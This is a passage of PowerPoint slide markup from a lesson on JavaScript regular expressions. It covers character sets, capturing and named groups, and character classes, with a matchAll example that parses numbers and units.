              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3196157029"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1340768"/>
          <a:ext cx="10972800" cy="3337560"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1381944">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3204800036"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9590856">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3597098593"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Characters</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Meaning</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3091237117"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0" err="1"/>
                        <a:t>x|y</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Matches either "x "or "y"</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3516396401"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>[abc123]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Character set. Matches the specified characters.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2173567729"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>[a-c1-3]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Character range. Matches the specified characters.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="435759975"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>[^abc123]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Negated character set. Matches anything else, except specified characters.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2839393340"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>[^a-c1-3]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Negated character range. Matches anything else, except specified characters.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="970950016"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(x)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Capturing group</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1852060281"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(?&lt;Name&gt;x)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Named capturing group.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2443655443"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>(?:x)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Non-capturing group. Matches "x", but does not remember the match.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2384671778"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Sisällön paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{82579CAB-BA1C-463E-A6B9-C5AEA6087E15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="4797152"/>
            <a:ext cx="10972800" cy="1872208"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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results</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"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 "123 Cm, 55 kg"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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matchAll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(?&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>number</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(?&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>unit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>a-z</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D16969"/>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D16969"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>gi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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result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of</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results</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">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unit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>} = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0" err="1">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groups</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unit</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13931468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3363E10-C59D-43E6-B344-B314CB5046F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Character Groups</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Taulukko 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8159C3E1-308E-427B-9C2A-32CF4CB7C99F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:ph idx="1"/>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3001657203"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1600200"/>
          <a:ext cx="10972800" cy="3505200"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1237928">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2982648760"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="9734872">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4267362029"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0" err="1"/>
                        <a:t>Groups</a:t>
                      </a:r>
                      <a:endParaRPr lang="fi-FI" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="fi-FI" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4247531122"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>\d</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches digit [0-9]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3795021365"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>\D</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches non-digit [^0-9]</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="273916570"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>\s</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches whitespace </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="pl-PL" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>[ \f\n\r\t\v\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]</a:t>
                      </a:r>
                      <a:endParaRPr lang="fi-FI" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2890781290"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>\S</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches non-whitespace </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="pl-PL" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>[^ \f\n\r\t\v\u00a0\u1680\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1495074642"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>\w</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches alphanumeric and _ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>[A-Za-z0-9_]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3865259523"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>\W</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>Matches non-alphanumeric and not _ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>[^A-Za-z0-9_]</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="fi-FI" sz="1800" b="0" i="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="dk1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t>.</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" noProof="0" dirty="0"/>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4277278954"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="370840">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="fi-FI" dirty="0"/>
                        <a:t>.</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" noProof="0" dirty="0"/>
                        <a:t>All characters, except newline (s flag, dot all enables matching all characters)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
